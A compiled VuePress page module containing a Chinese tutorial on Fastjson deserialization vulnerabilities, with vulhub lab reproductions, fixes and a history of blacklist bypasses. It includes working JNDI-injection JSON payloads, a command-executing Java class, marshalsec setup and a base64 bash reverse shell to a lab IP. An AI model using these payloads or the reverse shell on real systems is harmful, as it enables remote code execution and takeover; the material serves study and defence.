import{_ as s,W as n,X as a,a1 as e}from"./framework-b6a07282.js";const t="/assets/3-f8cca86f.png",p="/assets/1-5d7a7148.png",o="/assets/2-286aa5da.png",l="/assets/6-081ac65c.png",i="/assets/7-5a6e0310.png",c="/assets/5-144de950.png",u="/assets/4-9bd795f4.png",r="/assets/8-2ad15401.png",d={},v=e(`<h2 id="fastjson反序列化漏洞" tabindex="-1"><a class="header-anchor" href="#fastjson反序列化漏洞" aria-hidden="true">#</a> Fastjson反序列化漏洞</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>Fastjson反序列化漏洞是一种Java安全漏洞，它利用了Fastjson的Autotype功能，可以让攻击者在反序列化不可信数据时，指定恶意的类或方法，从而执行任意命令或代码。</li></ul><h4 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围" aria-hidden="true">#</a> 影响范围</h4><ul><li>CVE/CNVD-2017-18349 Fastjson1.2.24及之前版本</li><li>CNVD-2019-22238 Fastjson1.2.47及之前版本</li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ul><li>由于Fastjson为了支持完整的序列化，所以引入了Autotype功能，它允许用户在反序列化数据中通过“@type”指定反序列化的Class类型，会根据其值动态加载并实例化相应的类。但这种功能有安全风险，如果用户指定了一个恶意的类（如具有代码执行能力类：<code>TemplatesImpl</code>和<code>JdbcRowSetImpl</code>），就可能导致远程代码执行，比如指向一个包含JNDI引用的类名，从而触发JNDI注入并执行任意代码。。</li></ul><h4 id="详细原因" tabindex="-1"><a class="header-anchor" href="#详细原因" aria-hidden="true">#</a> 详细原因</h4><ol><li><p>fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。对于Json来说，想要把一个Java对象转换成字符串，可以有两种选择：基于属性、基于Getter和Setter。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">class</span> <span class="token class-name">Apple</span> implement <span class="token class-name">Fruit</span> <span class="token punctuation">{</span>
 <span class="token keyword">private</span> <span class="token class-name">Big_Decimal</span> price<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> iphone implement <span class="token class-name">Fruit</span> <span class="token punctuation">{</span>
 <span class="token keyword">private</span> <span class="token class-name">Big_Decimal</span> price<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

基于<span class="token class-name">Getter</span>和<span class="token class-name">Setter</span>的序列化：
toJSONString<span class="token operator">:</span><span class="token punctuation">{</span><span class="token string">&quot;fruit&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string">&quot;prive&quot;</span><span class="token operator">:</span><span class="token number">0.5</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
toJSONString<span class="token operator">:</span><span class="token punctuation">{</span><span class="token string">&quot;fruit&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string">&quot;prive&quot;</span><span class="token operator">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">}</span> #缺了类名反序列化分不清除
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>首先是基于Getter和Setter，由于它序列化后没有类名，少了类名，导致反序列化时存在问题。所以这个方案不用。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>基于属性的序列化，引入了<span class="token class-name">AutoType</span>。
<span class="token punctuation">{</span>
	<span class="token string">&quot;fruit&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>
		<span class="token string">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.hollis.lab.fastjson.test.Apple&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;price&quot;</span><span class="token operator">:</span><span class="token number">0.5</span>
		<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

为啥有<span class="token annotation punctuation">@type</span>？为了不让找错类型。
为啥有price？因为之前定义了。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>最后选择了基于属性，并且为了解决上述问题，Fastjson引入了AutoType，即在序列化的时候把原始类型记录下来。所以就解决了Fastjson反序列化的问题了。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token punctuation">{</span> 
	<span class="token string">&quot;b&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span> 
	<span class="token string">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span> 
	<span class="token string">&quot;dataSourceName&quot;</span><span class="token operator">:</span> <span class="token string">&quot;rmi://192.168.1.100:4444/TouchFile&quot;</span><span class="token punctuation">,</span> 
	<span class="token string">&quot;autoCommit&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span>
		 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

为啥有<span class="token annotation punctuation">@type</span>？为了不让找错类型。
<span class="token annotation punctuation">@type</span>后面的类一定会被加载读取。
为啥有dataSourceName？因为<span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">.</span></span>JdbcRowSetImpl</span>定义好的字段，当靶机收到伪造的请求就会去访问<span class="token constant">RMI</span>服务器，<span class="token constant">RMI</span>服务器就会将恶意的<span class="token keyword">class</span>文件的执行动作告诉靶机，靶机就会去执行。
为啥有autoCommit？因为<span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">.</span></span>JdbcRowSetImpl</span>定义好的字段，传了更好。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ol><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ul><li>远程代码执行（RCE）</li></ul><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><h4 id="cve-cnvd-2017-18349漏洞复现" tabindex="-1"><a class="header-anchor" href="#cve-cnvd-2017-18349漏洞复现" aria-hidden="true">#</a> CVE/CNVD-2017-18349漏洞复现</h4><h5 id="vulhub复现" tabindex="-1"><a class="header-anchor" href="#vulhub复现" aria-hidden="true">#</a> vulhub复现</h5><p>判断是否使用fastjon</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#非法格式报错</span>
<span class="token punctuation">{</span><span class="token string">&quot;a&quot;</span>:&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#使用dnslog来查看是否有回显</span>
<span class="token punctuation">{</span><span class="token string">&quot;test&quot;</span>:<span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;java.net.Inet4Address&quot;</span>,<span class="token string">&quot;val&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;4kk2kg.dnslog.cn&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+t+`"><ol><li>制作一个动作为“创建一个文件”的恶意class文件。</li></ol><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token comment">// javac TouchFile.java</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Runtime</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Process</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TouchFile</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;touch&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;/tmp/successs&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token class-name">Process</span> pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// do nothing</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>javac TouchFile.java <span class="token comment">#编译TouchFile.java</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol start="2"><li>使用python启动一个可以下载TouchFile.class的恶意网站</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">8080</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol start="3"><li>使用marshalsec启动RMI或LDAP服务</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">java</span> <span class="token parameter variable">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="token string">&quot;http://192.168.1.253:8080/#TouchFile&quot;</span> <span class="token number">4444</span> <span class="token comment">#启动RMI </span>
为啥又<span class="token comment">#号？因为marshalsec这个软件规定class文件要加。不加报错。</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ol start="4"><li>访问192.168.142.128:8090，然后抓包构造恶意请求</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>POST / HTTP/1.1
Host: <span class="token number">192.168</span>.1.130:8090
User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:107.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>
Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span>
Accept-Encoding: gzip, deflate
Content-Type: application/json
Connection: close
Upgrade-Insecure-Requests: <span class="token number">1</span>

<span class="token punctuation">{</span> 
	<span class="token string">&quot;b&quot;</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span> 
	<span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span> <span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, 
	<span class="token string">&quot;dataSourceName&quot;</span><span class="token builtin class-name">:</span> <span class="token string">&quot;rmi://192.168.1.100:4444/TouchFile&quot;</span>, 
	<span class="token string">&quot;autoCommit&quot;</span><span class="token builtin class-name">:</span> <span class="token boolean">true</span>
		 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+p+'"><ol start="5"><li>进入靶机查看是否有创建一个名为sucess的文件</li></ol><img src="'+o+`"><h4 id="cnvd-2019-22238漏洞复现" tabindex="-1"><a class="header-anchor" href="#cnvd-2019-22238漏洞复现" aria-hidden="true">#</a> CNVD-2019-22238漏洞复现</h4><h5 id="vulhub复现-1" tabindex="-1"><a class="header-anchor" href="#vulhub复现-1" aria-hidden="true">#</a> vulhub复现</h5><p>判断是否使用fastjon</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#非法格式报错</span>
<span class="token punctuation">{</span><span class="token string">&quot;a&quot;</span>:&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+l+`"><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#使用dnslog来查看是否有回显</span>
<span class="token punctuation">{</span><span class="token string">&quot;test&quot;</span>:<span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;java.net.Inet4Address&quot;</span>,<span class="token string">&quot;val&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;2dqg2r.dnslog.cn&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+i+`"><ol><li>使用JNDI-Injection-Exploit启动服务，并植入反弹shell。</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">&quot;bash -c {echo,bash -i &gt;&amp;/dev/tcp/192.168.1.253/6666 0&gt;&amp;1}|{base64,-d}|{bash,-i}&quot;</span> <span class="token parameter variable">-A</span> <span class="token string">&quot;192.168.1.100&quot;</span>

<span class="token comment">#命令必须Base64加密</span>
<span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">&quot;bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMS4yNTMvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}&quot;</span> <span class="token parameter variable">-A</span> <span class="token string">&quot;192.168.1.100&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>启动nc监听6666端口</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>nc.exe <span class="token parameter variable">-lvvp</span> <span class="token number">6666</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol start="3"><li>访问192.168.142.128:8090，然后抓包构造恶意请求</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>POST / HTTP/1.1
Host: <span class="token number">192.168</span>.1.130:8090
User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:107.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>
Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span>
Accept-Encoding: gzip, deflate
Content-Type: application/json
Connection: close
Upgrade-Insecure-Requests: <span class="token number">1</span>
Content-Length: <span class="token number">218</span>

<span class="token punctuation">{</span>
	<span class="token string">&quot;a&quot;</span>:<span class="token punctuation">{</span> <span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;java.lang.Class&quot;</span>, 
	<span class="token string">&quot;val&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>
	<span class="token punctuation">}</span>,
	<span class="token string">&quot;b&quot;</span>:<span class="token punctuation">{</span> 
	<span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, 
	<span class="token string">&quot;dataSourceName&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;ldap://192.168.1.100:1389/ewlf22&quot;</span>, 
	<span class="token string">&quot;autoCommit&quot;</span>:true
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+c+'"><ol start="4"><li>靶机上线</li></ol><img src="'+u+'"><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><ol><li><p>升级JDK</p><p>6u211 / 7u201 / 8u191 /11.0.1</p></li><li><p>升级Fastjson到最新版</p></li><li><p>使用安全产品过滤非法内容</p></li><li><p>更换其他序列化工具 Jackson/Gson</p></li><li><p>通过fastjson.properties文件配置：</p></li><li><p>通过类路径的fastjson.properties文件来配置，配置方式如下： fastjson.parser.safeMode=&quot;true</p></li><li><p>另可通过将有风险的类添加至黑名单进行防护： ParserConfig.getGlobalInstance().addDeny(&quot;类名&quot;);</p></li></ol><img src="'+r+`"><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3><ul><li>暂无</li></ul><h3 id="补充知识" tabindex="-1"><a class="header-anchor" href="#补充知识" aria-hidden="true">#</a> 补充知识</h3><h4 id="fastjson简介" tabindex="-1"><a class="header-anchor" href="#fastjson简介" aria-hidden="true">#</a> Fastjson简介</h4><ul><li>Fastjson是一个JSON工具库,它的作用就是把java对象转换为json形式，也可以用来将json转换为java对象。</li></ul><h4 id="jndi" tabindex="-1"><a class="header-anchor" href="#jndi" aria-hidden="true">#</a> JNDI</h4><ul><li>JNDI是Java命名和目录接口（Java Naming and Directory Interface的缩写），JNDI是一个用于访问不同类型的命名和目录服务的API。例如DNS、LDAP、RMI等。</li></ul><h4 id="jndi注入" tabindex="-1"><a class="header-anchor" href="#jndi注入" aria-hidden="true">#</a> JNDI注入</h4><ul><li>JNDI注入是一种利用Java命名和目录接口（JNDI）的特性来执行远程代码的攻击手法。JNDI注入的原理是通过控制JNDI调用的lookup参数，使其指向一个恶意的远程服务，从而下载并执行恶意代码。</li></ul><h4 id="cve-cnvd-2017-18349-fastjson1-2-24及之前版本" tabindex="-1"><a class="header-anchor" href="#cve-cnvd-2017-18349-fastjson1-2-24及之前版本" aria-hidden="true">#</a> CVE/CNVD-2017-18349 Fastjson1.2.24及之前版本</h4><p>@type没有里的值没有过滤，想传什么就传什么。导致容易受到攻击。</p><p>1、序列化字符准备类名、dataSourceName属性和autoCommit属性</p><p>2、JdbcRowSetImpl反序列化，调用 JdbcRowSetImpl的setAutoCommit()</p><p>3、setAutoCommit()调用connect()</p><p>4、connect()调用lookup()连接到LDAP/RMI 服务器</p><p>5、下载恶意代码到本地，执行，攻击发生</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>从<span class="token number">1.2</span><span class="token number">.25</span>开始，<span class="token class-name">Fastjson</span>默认关闭了<span class="token class-name">AutoType</span>，并增加了checkAutoType，它对<span class="token string">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span> 进行了过滤，不处理里面的值。

在<span class="token class-name">Fastjson1</span><span class="token number">.2</span><span class="token number">.41</span>之前，在checkAuto的代码中，会先进行黑白名单过滤。如果反序列化的类不在黑白名单中，那么才对目标类进行反序列化。
但是在加载的过程中，fastjson有一段特殊的处理，就是在具体加载类的时候会去掉className前后的<span class="token class-name">L</span>和<span class="token punctuation">;</span> 所以之后的<span class="token constant">POC</span>就变成了这样：<span class="token class-name">Lcom</span><span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">.</span>JdbcRowSetImpl<span class="token punctuation">;</span>

在<span class="token number">1.2</span><span class="token number">.42</span>版本中，在进行黑白名单检测的时候，fastjson先判断类的类名的前后是不是<span class="token class-name">L</span>和<span class="token punctuation">;</span>，如果是的话就截取掉前后的<span class="token class-name">L</span>和<span class="token punctuation">;</span>再进行黑白名单的校验。所以<span class="token constant">POC</span>又演化成了这样<span class="token operator">:</span><span class="token class-name">LLcom</span><span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">.</span>JdbcRowSetImpl<span class="token punctuation">;</span><span class="token punctuation">;</span>

在<span class="token number">1.2</span><span class="token number">.43</span>中，fastjson这次在黑白名单判断之前，增加了一个是否以<span class="token constant">LL</span>开头的判断
所以poc又演化了：<span class="token punctuation">[</span><span class="token class-name">LLcom</span><span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">.</span>JdbcRowSetImpl<span class="token punctuation">;</span><span class="token punctuation">;</span>

在<span class="token number">1.2</span><span class="token number">.44</span>中，fastjson做了更加严格的判断，只要前面有<span class="token class-name">L</span>后面有<span class="token punctuation">;</span>全部过滤。

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="cnvd-2019-22238-fastjson1-2-47及之前版本" tabindex="-1"><a class="header-anchor" href="#cnvd-2019-22238-fastjson1-2-47及之前版本" aria-hidden="true">#</a> CNVD-2019-22238 Fastjson1.2.47及之前版本</h4><ul><li>在1.2.47版本及以下的情况下，loadClass中默 认cache为true，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.jdbcRowSetlmpl 这个类，即可绕过黑名单。</li></ul><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>在<span class="token number">1.2</span><span class="token number">.47</span>版本中，autoType默认没有开启。在fastjson中有一个全局缓存，在类加载的时候，如果autotype没开启，就会先从缓存中获取类，如果缓存中有，则直接返回。
<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Class</span>类对应的反序列化为<span class="token class-name">MiscCode</span>，反序列时会取json串中的val值，并加载val对应的类。
如果fastjson为<span class="token boolean">true</span>，就会缓存这个val对应的<span class="token keyword">class</span>到全局缓存中。

<span class="token punctuation">{</span>
	<span class="token string">&quot;a&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token string">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.lang.Class&quot;</span><span class="token punctuation">,</span> 
	<span class="token string">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>
	<span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token string">&quot;b&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span> 
	<span class="token string">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span> 
	<span class="token string">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://192.168.1.100:1389/ewlf22&quot;</span><span class="token punctuation">,</span> 
	<span class="token string">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,69),k=[v];function m(b,h){return n(),a("div",null,k)}const q=s(d,[["render",m],["__file","Fastjson反序列化漏洞.html.vue"]]);export{q as default};
